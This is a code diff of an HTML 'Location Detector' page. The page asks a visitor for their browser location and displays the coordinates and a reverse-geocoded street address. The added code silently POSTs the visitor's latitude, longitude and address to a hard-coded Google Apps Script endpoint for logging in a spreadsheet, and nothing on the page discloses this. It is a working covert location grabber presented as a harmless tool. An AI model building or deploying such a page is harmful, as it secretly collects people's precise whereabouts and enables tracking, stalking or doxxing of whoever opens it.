@@ -1,88 +1,59 @@
-     <!DOCTYPE html>
-     <html lang="en">
-     <head>
-         <meta charset="UTF-8">
-         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-         <title>Location Detector</title>
-         <style>
-             body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; }
-             button { padding: 10px 20px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
-             button:hover { background: #0056b3; }
-             #location { margin-top: 20px; padding: 10px; background: #f8f9fa; border-radius: 5px; }
-             #error { color: red; }
-         </style>
-     </head>
-     <body>
-         <h1>Get Your Approximate Address</h1>
-         <p>Click the button below to allow access to your location. This will show your coordinates and estimated address.</p>
-         <button id="getLocation">Detect My Location</button>
-         <div id="location"></div>
-         <div id="error"></div>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Location Detector</title>
+</head>
+<body>
+  <h1>Detect My Location</h1>
+  <button id="getLocation">Detect</button>
+  <div id="location"></div>
+  <div id="error" style="color:red;"></div>
 
-         <script>
-             document.getElementById('getLocation').addEventListener('click', () => {
-                 const locationDiv = document.getElementById('location');
-                 const errorDiv = document.getElementById('error');
-                 locationDiv.innerHTML = ''; // Clear previous results
-                 errorDiv.innerHTML = '';
+  <script>
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwInXFQirWnE-DmaPYRA5gzGkfc-_I66Tl0nIFzvDNQvYvrv7yqwMJRYjwfdJzu2O8q/exec"; // Thay bằng URL của bạn
 
-                 if (!navigator.geolocation) {
-                     errorDiv.innerHTML = 'Geolocation is not supported by your browser.';
-                     return;
-                 }
+    document.getElementById("getLocation").addEventListener("click", () => {
+      const locationDiv = document.getElementById("location");
+      const errorDiv = document.getElementById("error");
+      locationDiv.innerHTML = "";
+      errorDiv.innerHTML = "";
 
-                 console.log('Requesting location...'); // Debug log
+      if (!navigator.geolocation) {
+        errorDiv.textContent = "Geolocation is not supported by your browser.";
+        return;
+      }
 
-                 navigator.geolocation.getCurrentPosition(
-                     async (position) => {
-                         console.log('Location received:', position); // Debug log
-                         const lat = position.coords.latitude;
-                         const lon = position.coords.longitude;
-                         locationDiv.innerHTML = `<strong>Coordinates:</strong> Latitude ${lat}, Longitude ${lon}<br>Fetching address...`;
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
 
-                         try {
-                             // Reverse geocode using Nominatim (with CORS mode)
-                             const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
-                             const response = await fetch(url, { mode: 'cors' });
-                             if (!response.ok) {
-                                 throw new Error(`HTTP ${response.status}: ${response.statusText}`);
-                             }
-                             const data = await response.json();
-                             
-                             console.log('Geocoding response:', data); // Debug log
-                             
-                             if (data && data.display_name) {
-                                 locationDiv.innerHTML += `<br><strong>Approximate Address:</strong> ${data.display_name}`;
-                             } else {
-                                 locationDiv.innerHTML += '<br><strong>Address:</strong> Could not retrieve address (try a different service).';
-                             }
-                         } catch (err) {
-                             console.error('Geocoding error:', err);
-                             locationDiv.innerHTML += '<br><strong>Address:</strong> Error fetching address. Coordinates only.';
-                         }
-                     },
-                     (error) => {
-                         console.error('Geolocation error:', error); // Debug log
-                         let errorMsg = 'Error getting location: ';
-                         switch (error.code) {
-                             case error.PERMISSION_DENIED:
-                                 errorMsg += 'Permission denied by user. Try allowing in browser settings.';
-                                 break;
-                             case error.POSITION_UNAVAILABLE:
-                                 errorMsg += 'Location information unavailable (check device settings).';
-                                 break;
-                             case error.TIMEOUT:
-                                 errorMsg += 'Request timed out. Try again.';
-                                 break;
-                             default:
-                                 errorMsg += 'Unknown error occurred.';
-                         }
-                         errorDiv.innerHTML = errorMsg;
-                     },
-                     { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 } // Increased timeout
-                 );
-             });
-         </script>
-     </body>
-     </html>
-     
+        locationDiv.innerHTML = `Latitude: ${lat}, Longitude: ${lon}`;
+
+        try {
+          // Lấy địa chỉ từ OpenStreetMap
+          const response = await fetch(
+            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`
+          );
+          const data = await response.json();
+          const address = data.display_name || "Unknown";
+
+          locationDiv.innerHTML += `<br>Address: ${address}`;
+
+          // 👉 Gửi vào Google Sheets
+          await fetch(SCRIPT_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ latitude: lat, longitude: lon, address })
+          });
+        } catch (err) {
+          errorDiv.textContent = "Error fetching address or sending data.";
+          console.error(err);
+        }
+      }, (error) => {
+        errorDiv.textContent = "Error getting location: " + error.message;
+      });
+    });
+  </script>
+</body>
+</html>
